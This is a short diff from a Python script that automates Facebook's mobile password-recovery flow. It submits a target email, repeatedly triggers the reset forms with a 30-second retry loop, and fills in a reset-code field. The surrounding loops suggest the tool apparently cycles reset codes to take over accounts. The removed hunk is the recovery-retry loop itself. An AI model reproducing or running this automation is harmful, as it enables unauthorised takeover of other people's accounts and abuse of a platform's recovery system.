@@ -74,27 +74,6 @@ while newpass == test:
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   poptart = soup.find(string="n")
-  while poptart == test:
-    print(browser.geturl())
-    browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
-    browser.select_form(nr=0)
-    browser.form['email'] = email
-    browser.submit()
-    """selection confirmation"""
-    browser.select_form(nr=0)
-    browser.submit()
-    browser.select_form(nr=0)
-    browser.submit()
-    browser.select_form(nr=0)
-    browser.submit()
-    browser.select_form(nr=0)
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    poptart = soup.find(string="n")
-    print("|", end='\r')
-    print("-", end='\r')
-    browser.close()
-    sleep(30)
   browser.select_form(nr=0)
   """reset = input('Code: ')"""
   browser.form['n'] = reset
